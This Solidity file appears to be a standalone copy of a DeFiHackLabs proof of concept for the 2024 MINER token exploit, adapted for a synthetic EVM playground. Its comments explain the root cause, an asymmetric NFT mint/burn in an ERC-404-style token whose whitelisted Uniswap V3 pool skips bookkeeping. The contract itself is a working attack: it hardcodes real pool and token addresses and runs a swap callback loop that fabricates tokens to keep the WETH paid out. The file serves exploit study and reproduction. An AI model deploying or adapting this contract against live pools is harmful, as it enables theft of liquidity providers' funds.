// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

// Synthetic standalone exploit for the EVM Playground (2024-02-Miner).
//
// The DeFiHackLabs PoC (test/Miner_exp.sol) runs the whole attack INLINE in
// the Foundry test contract itself: `testExploit()` calls `pool.swap(...)`
// directly from the test, and the Uniswap V3 swap callback
// (`uniswapV3SwapCallback`) also lives on the test contract. There is no
// standalone exploit contract to deploy. This file is a faithful,
// self-contained copy of that inline attack (swap -> callback loop) so the
// playground can deploy it and record attack(). Logic and constants are
// copied verbatim from test/Miner_exp.sol::testExploit() /
// ::uniswapV3SwapCallback().
//
// Root cause: MINER is an "ERC-X" / ERC-404-style hybrid ERC20+NFT token.
// _update() mints/burns NFTs based on whole-token (1e18) boundary crossings,
// computed INDEPENDENTLY for the sender (burn side) and receiver (mint side).
// The Uniswap V3 pool is auto-whitelisted (easyLaunch), so transfers into/out
// of the pool skip NFT bookkeeping entirely, while the non-whitelisted
// attacker side still mints/burns on every transfer. Fractional 0.5e18
// self-transfers let the attacker repeatedly straddle the 1e18 boundary,
// minting more NFT-backed value than is ever burned. Uniswap V3's swap()
// pays the output token (WETH) BEFORE invoking the callback and only checks
// that the pool's input-token (MINER) balance rose by the owed amount (the
// `IIA` check) -- it never checks HOW that MINER arrived. The attacker
// repays with MINER fabricated for free via the mint/burn asymmetry and
// keeps the WETH the pool already paid out.

interface IMinerUNIV3POOL {
    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external;
}

interface IMiner {
    function transfer(address to, uint256 value) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract MinerDrain {
    IMinerUNIV3POOL constant pool = IMinerUNIV3POOL(0x732276168b421D4792E743711E1A48172EA574a2);
    IMiner constant MINER = IMiner(0xE77EC1bF3A5C95bFe3be7BDbACfe3ac1c7E454CD);

    // step 1: sell ~1000 MINER into the pool. zeroForOne=false sells
    // token1 (MINER) for token0 (WETH); the pool pays the WETH out FIRST,
    // then calls uniswapV3SwapCallback to collect the owed MINER.
    function attack() external {
        bool zeroForOne = false;
        int256 amountSpecified = 999_999_999_999_999_998_000;
        uint160 sqrtPriceLimitX96 = 1_461_446_703_485_210_103_287_273_052_203_988_822_378_723_970_340;
        bytes memory data = abi.encodePacked(uint8(0x61));
        pool.swap(address(this), zeroForOne, amountSpecified, sqrtPriceLimitX96, data);
    }

    // step 2: the repayment window. 2000 iterations of a fractional
    // 0.5e18 transfer into the (whitelisted) pool -- which mints/burns no
    // NFTs on the pool side -- followed by a 0.5e18 self-transfer, which
    // DOES trigger the asymmetric NFT mint/burn on the attacker's own
    // (non-whitelisted) balance, regenerating the MINER just pushed out.
    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external {
        MINER.balanceOf(address(this));
        for (uint256 i = 0; i < 2000; i++) {
            MINER.transfer(address(pool), 499_999_999_999_999_999);
            MINER.transfer(address(this), 499_999_999_999_999_999);
        }
    }
}
